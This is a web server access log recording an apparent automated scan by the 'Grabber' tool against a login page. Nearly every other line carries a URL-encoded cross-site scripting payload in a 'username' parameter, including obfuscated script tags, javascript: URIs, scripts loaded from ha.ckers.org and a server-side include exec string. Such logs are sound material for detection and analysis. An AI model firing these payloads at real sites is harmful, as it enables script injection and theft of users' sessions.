172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /?username=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:29 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
